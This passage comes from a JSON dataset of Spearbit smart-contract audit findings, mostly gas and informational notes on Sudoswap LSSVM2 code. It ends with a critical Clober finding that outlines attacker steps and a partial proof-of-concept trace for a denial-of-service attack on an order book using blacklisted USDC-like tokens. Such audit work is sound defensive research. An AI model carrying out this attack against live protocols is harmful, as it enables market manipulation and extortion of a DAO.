over validating later.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Loop counters are not gas optimized in some places", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Loop counters are optimized in many parts of the code by using an unchecked {++i} (unchecked + prefix increment). However, this is not done in some places where it is safe to do so.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization MerklePropertyChecker.sol#L22,"]}, {"title": "Mixed use of custom errors and revert strings is inconsistent and uses extra gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In some parts of the code, custom errors are declared and later used (CurveErrorCodes and Own- able Errors), while in other parts, classic revert strings are used in require statements. Instead of using error strings, custom errors can be used, which would reduce deployment and runtime costs. Using only custom errors would improve consistency and gas cost. This would also avoid long revert strings which consume extra gas. Each extra memory word of bytes past the original 32 incurs an MSTORE which costs 3 gas. This happens at LSSVMPair.sol#L133, LSSVMPair.sol#L666 and LSSVMPairFactory.sol#L505.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Array length read in each iteration of the loop wastes gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "If not cached, the Solidity compiler will always read the length of the array from storage during each iteration. For storage array, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory array, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization LSSVMPairERC1155.sol, LSSVMPairETH.sol, LSSVMPairERC721.sol,"]}, {"title": "Not tightly packing struct variables consumes extra storage slots and gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Gas efficiency can be achieved by tightly packing structs. Struct variables are stored in 32 bytes each and so you can group smaller types to occupy less storage.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Variables that are redeclared in each loop iteration can be declared once outside the loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "price is redefined in each iteration of the loop and right after declaration is set to a new value. for (uint256 i; i < numNFTs; i++) { uint256 price; (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, pair.factory().protocolFeeMultiplier()); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Caller of swapTokenForSpecificNFTs() must be able to receive ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _refundTokenToSender() sends ETH back to the caller. If this caller is a contract then it might not be able to receive ETH. If it can't receive ETH then the transaction will revert. function _refundTokenToSender(uint256 inputAmount) internal override { // Give excess ETH back to caller if (msg.value > inputAmount) { payable(msg.sender).safeTransferETH(msg.value - inputAmount); } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "order.doPropertyCheck could be replaced by the pair's propertyChecker()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The field+check for a separate order.doPropertyCheck in struct SellOrder is unnecessary be- cause this can already be checked via the pair's propertyChecker() without relying on the user to explicitly specify it in their order.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "_payProtocolFeeFromPair() could be replaced with _sendTokenOutput()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Both ERC20 and ETH versions of _payProtocolFeeFromPair() and _sendTokenOutput() are iden- tical in their parameters and logic.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "False positive in test_getSellInfoWithoutFee() when delta == FixedPointMathLib.WAD due to wrong implementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In test_getSellInfoWithoutFee, delta is not validated via validateDelta, which causes a false positive in the current test when delta == FixedPointMathLib.WAD. This can be tried with the following proof of concept // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import {FixedPointMathLib} from ,! \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/FixedPointMathLib.sol\"; contract test{ using FixedPointMathLib for uint256; constructor() { uint256 delta = FixedPointMathLib.WAD; uint256 invDelta = FixedPointMathLib.WAD.divWadDown(delta); uint outputValue = delta.divWadDown(FixedPointMathLib.WAD - invDelta); // revert } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Checks-Effects-Interactions pattern not used in swapNFTsForToken()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "It is a defensive programming pattern to first take NFTs and then send the tokens (i.e. the Checks- Effects-Interactions pattern). function swapNFTsForToken(...) ... { ... _sendTokenOutput(tokenRecipient, outputAmount); ... _sendTokenOutput(royaltyRecipients[i], royaltyAmounts[i]); ... _payProtocolFeeFromPair(_factory, protocolFee); ... _takeNFTsFromSender(...); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two versions of withdrawERC721() and withdrawERC1155()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "withdrawERC721() and withdrawERC1155() with slightly different implementations. This is more difficult to maintain.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing sanity/threshold checks may cause undesirable behavior and/or waste of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Numerical user inputs and external call returns that are subject to thresholds due to the contract's logic should be checked for sanity to avoid undesirable behavior or reverts in later logic and wasting unnecessary gas in the process.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Deviation from standard/uniform naming convention affects readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Following standard/uniform naming conventions are essential to make a codebase easy to read and understand.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational LSSVMPairFactory.sol#L471, LSSVMRouter.sol#L128-L135,"]}, {"title": "Function _getRoyaltyAndSpec() contains code duplication which affects maintainability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _getRoyaltyAndSpec() is rather long and contains code duplication. This makes it difficult to maintain. 45 function _getRoyaltyAndSpec(address tokenAddress, uint256 tokenId, uint256 value) ... if (spec <= NOT_CONFIGURED && spec > NONE) { try IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId) returns (...) { // Support Art Blocks override require(recipients_.length == bps.length); return (recipients_, _computeAmounts(value, bps), ARTBLOCKS, royaltyAddress, addToCache); } catch {} ... } else { // Spec exists, just execute the appropriate one ... ... if (spec == ARTBLOCKS) { // Art Blocks spec uint256[] memory bps; (recipients, bps) = IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId); require(recipients.length == bps.length); return (recipients, _computeAmounts(value, bps), spec, royaltyAddress, addToCache); } else ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "getSellInfo always adds 1 rather than rounding which leads to last item being sold at 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Based on the comment // We calculate how many items we can sell into the linear curve until the spot price reaches 0, rounding up. In cases where delta == spotPrice && numItems > 1, the last item would be sold at 0: delta = 100; spotPrice = 100; numItems = 2; uint256 totalPriceDecrease = delta * numItems = 200; Therefore succeeds at: if (spotPrice < totalPriceDecrease) Later calculated: uint256 numItemsTillZeroPrice = spotPrice / delta + 1; That would result in 2, while the division was an exact 1, therefore is not rounded up in case where spotPrice == delta but increased always by 1.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Natspec for robustSwapETHForSpecificNFTs() is slightly misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function robustSwapETHForSpecificNFTs() has this comment: * @dev We assume msg.value >= sum of values in maxCostPerPair This doesn't have to be the case. The transaction just reverts if msg.value isn't sufficient.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two copies of pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From() are present", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Both contracts LSSVMRouter and VeryFastRouter contain the functions pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From(). This is more difficult to maintain as both copies have to stay in synch.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Not using error strings in require statements obfuscates monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "require statements should include meaningful error messages to help with monitoring the system.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "prices and balances in the curves may not be updated after calls to depositNFTs() and depositERC20()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions depositNFTs() and depositERC20() allow anyone to add NFTs and/or ERC20 to a pair but do not update the prices and balances in the curves. And if they were to do so, then the functions might be abused to update token prices with irrelevant tokens and NFTs. However, it is not clear if/how the prices and balances in the curves are updated to reflect this. The owner can't fully rely on emits.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions enableSettingsForPair() and disableSettingsForPair() can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions enableSettingsForPair() and disableSettingsForPair() define a temporary vari- able pair. This could also be used earlier in the code to simplify the code. function enableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); LSSVMPair pair = LSSVMPair(pairAddress); ... } function disableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ... LSSVMPair pair = LSSVMPair(pairAddress); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Design asymmetry decreases code readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _calculateBuyInfoAndUpdatePoolParams() performs a check on maxExpectedToken- Input inside its function. On the other hand, the comparable check for _calculateSellInfoAndUpdatePoolParams() is done outside of the function: function _swapNFTsForToken(...) ... { // LSSVMPairERC721.sol ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(...) require(outputAmount >= minExpectedTokenOutput, \"Out too few tokens\"); ... } The asymmetry in the design of these functions affects code readability and may confuse the reader.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Providing the same _nftID multiple times will increase numPairNFTsWithdrawn multiple times to potentially cause confusion", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "If one accidentally (or intentionally) supplies the same id == _nftID multiple times in the array ids[], then numPairNFTsWithdrawn is increased multiple times. Assuming this value is used via indexing for the user interface, this could be misleading.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Dual interface NFTs may cause unexpected behavior if not considered in future", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Some NFTs support both the ERC721 and the ERC1155 standard. For example NFTs of the Sandbox project. Additionally, the internal layout of the parameters of cloneETHPair and cloneERC1155ETHPair are very similar: | cloneETHPair | cloneERC1155ETHPair | | --- | --- | | mstore(add(ptr, 0x3e), shl(0x60, factory)) | mstore(add(ptr, 0x3e), shl(0x60, factory)) | | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | | mstore(add(ptr, 0x66), shl(0x60, nft)) | mstore(add(ptr, 0x66), shl(0x60, nft)) | | mstore8(add(ptr, 0x7a), poolType) | mstore8(add(ptr, 0x7a), poolType) | | mstore(add(ptr, 0x7b), shl(0x60, propertyChecker)) | mstore(add(ptr, 0x7b), nftId) | In case there is a specific function that only works on ERC721, and that can be applied to ERC1155 pairs, in combination with an NFT that supports both standards, then an unexpected situation could occur. Currently, this is not the case, but that might occur in future iterations of the code.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing event emission in multicall", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Not emitting events on success/failure of calls within a multicall makes debugging failed multicalls difficult. There are several actions that should always emit events for transparency such as ownership change, transfer of ether/tokens etc. In the case of a multicall function, it is recommended to emit an event for succeeding (or failing) calls.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Returning only one type of fee from getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuote- WithRoyalties() could be misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() re- turn a protocolFee variable. There are also other fees like tradeFee and royaltyTotal that are not returned from these functions. Given that these functions might be called from the outside, it is not clear why other fees are not included here.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two ways to query the assetRecipient could be confusing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The contract LSSVMPair has two ways to query the assetRecipient. On via the getter assetRecip- ient() and one via getAssetRecipient(). Both give different results and generally getAssetRecipient() should be used. Having two ways could be confusing. address payable public assetRecipient; function getAssetRecipient() public view returns (address payable _assetRecipient) { ... // logic to determine _assetRecipient }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions expecting NFT deposits can validate parameters for sanity and optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions expecting NFT deposits in their typical flows can validate parameters for sanity and opti- mization.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions expecting ETH deposits can check msg.value for sanity and optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions that expect ETH deposits in their typical flows can check for non-zero values of msg.value for sanity and optimization.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "LSSVMPairs can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "At the different LSSVMPairs, PairVariant and IMMUTABLE_PARAMS_LENGTH can be passed to LSSVM- Pair, which could store them as immutable. Then functions pairVariant() and _immutableParamsLength() can also be moved to LSSVMPair, which would simplify the code.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Unused values in catch can be avoided for better readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Employing a catch clause with higher verbosity may reduce readability. Solidity supports different kinds of catch blocks depending on the type of error. However, if the error data is of no interest, one can use a simple catch statement without error data.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Stale constant and comments reduce readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "After some updates, the logic was added ~2 years ago when enum was changed to int16. Based on the comments and given that was upgradeable, it was expected that one could add new unconfigured specs with negative IDs between NONE (by decrementing it) and NOT_CONFIGURED. In this non-upgradeable fork, the current constants treat only the spec ID of 0 as NOT_CONFIGURED. // Anything > NONE and <= NOT_CONFIGURED is considered not configured int16 private constant NONE = -1; int16 private constant NOT_CONFIGURED = 0;", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Different MAX_FEE value and comments in different places is misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The same MAX_FEE constant is declared in different files with different values, while comments indi- cate that these values should be the same. // 50%, must <= 1 - MAX_PROTOCOL_FEE (set in LSSVMPairFactory) uint256 internal constant MAX_FEE = 0.5e18; uint256 internal constant MAX_PROTOCOL_FEE = 0.1e18; // 10%, must <= 1 - MAX_FEE`", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Events without indexed event parameters make it harder/inefficient for off-chain tools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Indexed event fields make them quickly accessible to off-chain tools that parse events. However, note that each indexed field costs extra gas during emission; so it's not necessarily best to index the maximum allowed per event (three fields).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational PropertyCheckerFactory.sol#L11, LSSVMPair.sol#L83,"]}, {"title": "Some functions included in LSSVMPair are not found in ILSSVMPair.sol and ILSSVMPairFactory- Like.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "LSSVMPair contract defines the following functions which are missing from interface ILSSVMPair: 53 ROYALTY_ENGINE() spotPrice() delta() assetRecipient() pairVariant() factory() swapNFTsForToken() (2 versions) swapTokenForSpecificNFTs() getSellNFTQuoteWithRoyalties() call() withdrawERC1155()", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Absent/Incomplete Natspec affects readability and maintenance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Comments are key to understanding the codebase logic. In particular, Natspec comments provide rich documentation for functions, return variables and more. This documentation aids users, developers and auditors in understanding what the functions within the contract are meant to do. However, some functions within the codebase contain issues with respect to their comments with either no Natspec or incomplete Natspec annotations, leading to partial descriptions of the functions.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational IOwnershipTransferReceiver.sol#L6, OwnableWithTransferCallback.sol#L39-L42, RangeProp-"]}, {"title": "MAX_SETTABLE_FEE value does not follow a standard notation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The protocol establishes several constant hard-coded MAX_FEE-like variables across different con- tracts. The percentages expressed in those variables should be declared in a standard way all over the codebase. In StandardSettings.sol#L22, the standard followed by the rest of the codebase is not respected. Not respecting the standard notation may confuse the reader.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "No modifier for __Ownable_init", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Usually __Ownable_init also has a modifier like initializer or onlyInitializing, see Own- ableUpgradeable.sol#L29. The version in OwnableWithTransferCallback.sol doesn't have this. It is not really necessary as the function is internal but it is more robust if it has. function __Ownable_init(address initialOwner) internal { _owner = initialOwner; }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Wrong value of seconds in year slightly affects precision", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Calculation of ONE_YEAR_SECS takes into account leap years (typically 365.25 days), looking for most exact precision. However as can be seen at NASA and stackoverflow, the value is slightly different. Current case: 365.2425 days = 31_556_952 / (24 * 3600) NASA case: 365.2422 days = 31_556_926 / (24 * 3600)", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing idempotent checks may be added for consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Setter functions could check if the value being set is the same as the variable's existing value to avoid doing a state variable write in such scenarios and they could also revert to flag potentially mismatched offchain-onchain states. While this is done in many places, there are a few setters missing this check.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing events affect transparency and monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Missing events in critical functions, especially privileged ones, reduce transparency and ease of monitoring. Users may be surprised at changes affected by such functions without being able to observe related events.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational LSSVMPair.sol#L640-L645, LSSVMPairFactory.sol#L485-L492, LSSVMPairFactory.sol#L501-L508,"]}, {"title": "Wrong error returned affects debugging and off-chain monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Error.INVALID_NUMITEMS is declared for 0 case, but is returned twice in the same function: first time for numItems == 0 and second time for numItems >= nftBalance. This can make hard to know why it is failing.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions can be renamed for clarity and consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Since both functions cloneETHPair() and cloneERC20Pair() use IERC721 nft as a parameter, renaming them to cloneERC721ETHPair() and cloneERC721ERC20Pair() respectively makes it clearer that the functions process ERC721 tokens. This also provides consistency in the naming of functions considering that we already have function cloneERC1155ETHPair() using this nomenclature.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two events TokenDeposit() with different parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The event TokenDeposit() of LSSVMPairFactory has an address parameter while the event Tok- enDeposit() of LSSVMPair has an uint256 parameter. This might be confusing. contract LSSVMPairFactory { ... event TokenDeposit(address poolAddress); ... } abstract contract LSSVMPair ... { ... event TokenDeposit(uint256 amount); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Unused imports affect readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The following imports are unused in  XykCurve.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {LSSVMPair} from \"../LSSVMPair.sol\"; import {LSSVMPairERC20} from \"../LSSVMPairERC20.sol\"; import {LSSVMPairCloner} from \"../lib/LSSVMPairCloner.sol\"; import {ILSSVMPairFactoryLike} from \"../LSSVMPairFactory.sol\";  LSSVMPairERC20.sol 58 import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\"; import {CurveErrorCodes} from \"./bonding-curves/CurveErrorCodes.sol\";  LSSVMPairETH.sol import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\"; import {ICurve} from \"./bonding-curves/ICurve.sol\";", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Use of isPair() is not intuitive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "There are two usecases for isPair() 1) To check if the contract is a pair of any of the 4 types. Here the type is always retrieved via pairVariant(). 2) To check if a pair is ETH / ERC20 / ERC721 / ERC1155. Each of these values are represented by two different pair types. Using isPair() this way is not intuitive and some errors have been made in the code where only one value is tested. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\". Function isPair() could be refactored to make the code easier to read and maintain. function isPair(address potentialPair, PairVariant variant) public view override returns (bool) { ... } These are the occurrences of use case 1: LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ,! LSSVMPairFactory.sol: address\"); ,! LSSVMPairFactory.sol: require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair if (isPair(recipient, LSSVMPair(recipient).pairVariant())) { // router interaction, which first queries `pairVariant()` LSSVMPairERC20.sol: LSSVMPairERC20.sol: LSSVMPairERC20.sol: erc721/LSSVMPairERC721.sol: erc721/LSSVMPairERC721.sol: erc1155/LSSVMPairERC1155.sol: // router and VeryFastRouter function pairTransferERC20From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { router.pairTransferERC20From(..., pairVariant()); router.pairTransferERC20From(..., pairVariant() router.pairTransferERC20From(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferNFTFrom(..., pairVariant()); router.pairTransferERC1155From(..., pairVariant()); ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferNFTFrom(..., ILSSVMPairFactoryLike.PairVariant variant ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... ... } function pairTransferERC1155From(..., ILSSVMPairFactoryLike.PairVariant variant) ... { ... require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } These are the occurrences of use case 2: 59 LSSVMPairFactory.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: StandardSettings.sol: (isPair(...ERC721_ERC20) ...isPair(....ERC721_ETH) ...isPair(...ERC721_ERC20) ...isPair(...ERC721_ETH) ...isPair(...ERC721_ERC20) || isPair(...ERC1155_ERC20)) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20) || ...isPair(...ERC1155_ETH) || ...isPair(...ERC1155_ERC20)", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Royalty related code spread across different contracts affects readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The contract LSSVMPairFactory contains the function authAllowedForToken(), which has a lot of interactions with external contracts related to royalties. The code is rather similar to code that is present in the RoyaltyEngine contract. Combining this code in RoyaltyEngine contract would make the code cleaner and easier to read.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "OrderBook Denial of Service leveraging blacklistable tokens like USDC", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The issue was spotted while analysing additional impact and fix for 67 Proof of concept checked with the original audit commit: 28062f477f571b38fe4f8455170bd11094a71862 and the newest available commit from dev branch: 2ed4370b5de9cec5c455f5485358db194f093b01 Due to the architecture decision which implements orders queue as a cyclic buffer the OrderBook after reaching MAX_ORDERS (~32k) for a given price point, starts to overwrite stale orders. If an order was never claimed or it is broken, so it cannot be claimed, it is not possible to place a new order in a queue. This emerges due to a fact that it is not possible to finalize the stale order and deliver the underlying assets, what is done while placing a new and replacing a stale order. Effectively this issue can be used to block the main functionality of the OrderBook, so placing new orders for a given price point. Only a single broken order per price-point is enough to lead to this condition. The issue will not be immediately visible as it requires the cyclic buffer to make a circle and encounter the broken order. The proof of concept in SecurityAuditTests.sol attachment implements a simple scenario where a USDC-like mock token is used: 1. Mallory creates one ASK order at some price point (to sell X base tokens for Y quoteTokens). 2. Mallory transfers ownership of the OrderNFT token to an address which is blacklisted by quoteToken (e.g. USDC) 3. Orders queue implemented as a circular buffer over time overflows and starts replacing old orders. 4. When it is the time to replace the order the quoteToken is about to be transferred, but due to the blacklist the assets cannot be delivered. 5. At this point it is impossible to place new orders at this price index, unless the owner of the OrderNFT transfers it to somebody who can receive quoteToken. Proof of concept result for the newest 2ed4370b5de9cec5c455f5485358db194f093b01 commit: # $ git clone ... && git checkout 2ed4370b5de9cec5c455f5485358db194f093b01 # $ forge test -m \"test_security_BlockOrderQueueWithBlacklistableToken\" [25766] MockOrderBook::limitOrder(0x0000000000000000000000000000000000004444, 3, 0, ,! 333333333333333334, 2, 0x) [8128] OrderNFT::onBurn(false, 3, 0) [1448] MockOrderBook::getOrder((false, 3, 0)) [staticcall]  (1, 0, 0x00000000000000000000000000000000DeaDBeef) emit Approval(owner: 0x00000000000000000000000000000000DeaDBeef, approved: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888) emit Transfer(from: 0x00000000000000000000000000000000DeaDBeef, to: 0x0000000000000000000000000000000000000000, tokenId: 20705239040371691362304267586831076357353326916511159665487572671397888)  () emit ClaimOrder(claimer: 0x0000000000000000000000000000000000004444, user: 0x00000000000000000000000000000000DeaDBeef, rawAmount: 1, bountyAmount: 0, orderIndex: 0, priceIndex: 3, isBase: false) [714] MockSimpleBlockableToken::transfer(0x00000000000000000000000000000000DeaDBeef, 10000) ,! ,! ,! ,! ,! ,!  \"blocked\"  \"blocked\"  \"blocked\" 5 In real life all *-USDC and USDC-* pairs as well as other pairs where a single token implements a block list are affected. The issue is also appealing to the attacker as at any time if the attacker controls the blacklisted wallet address, he/she can transfer the unclaimable OrderNFT to a whitelisted address to claim his/her assets and to enable processing until the next broken order is placed in the cyclic buffer. It can be used either to manipulate the market by blocking certain types of orders per given price points or simply to blackmail the DAO to resume operations.", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": 